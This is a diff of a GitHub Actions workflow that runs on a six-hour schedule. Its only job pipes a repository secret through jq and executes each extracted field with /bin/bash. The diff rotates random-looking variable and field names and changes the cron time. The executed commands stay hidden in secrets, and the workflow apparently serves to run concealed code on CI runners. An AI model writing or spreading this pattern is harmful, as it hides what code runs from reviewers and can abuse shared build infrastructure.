@@ -3,27 +3,25 @@ name: dengshiming7654
 on:
   workflow_dispatch:
   schedule:
-    - cron: '50 0/6 * * *'
+    - cron: '1 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: dengshiming7654
         env:
-          qo0174: ${{ secrets.qo0174 }}
+          udozp677: ${{ secrets.udozp677 }}
         run: |
-          echo $qo0174 | jq -r .tfpwp18 | /bin/bash
-          echo $a00 | jq -r .gizgb97 | /bin/bash
-          echo $cazjl89869 | jq -r .zce869 | /bin/bash
-          echo $vbj623 | jq -r .jm44786 | /bin/bash
-          echo $p01895 | jq -r .ivk74 | /bin/bash
-          echo $bjj6096 | jq -r .l4409 | /bin/bash
-          echo $znr1 | jq -r .em0869 | /bin/bash
-          echo $me3 | jq -r .stz107 | /bin/bash
-          echo $efjpo79831 | jq -r .c64853 | /bin/bash
-          echo $uasy50508 | jq -r .jm6637 | /bin/bash
-          echo $vi002 | jq -r .oio228 | /bin/bash
-          echo $duq186 | jq -r .sihc67 | /bin/bash
-          echo $pqbda43672 | jq -r .xonf659 | /bin/bash
+          echo $udozp677 | jq -r .mfdd48506 | /bin/bash
+          echo $yqlje90521 | jq -r .xmrl6544 | /bin/bash
+          echo $gf755 | jq -r .y3357 | /bin/bash
+          echo $rgkc96617 | jq -r .qyiz972 | /bin/bash
+          echo $x99902 | jq -r .nfsm770 | /bin/bash
+          echo $wfimc2 | jq -r .fxq4753 | /bin/bash
+          echo $osy46243 | jq -r .z0 | /bin/bash
+          echo $o96244 | jq -r .vxlfe63149 | /bin/bash
+          echo $xx5 | jq -r .yom0 | /bin/bash
+          echo $k64934 | jq -r .hwz41287 | /bin/bash
 
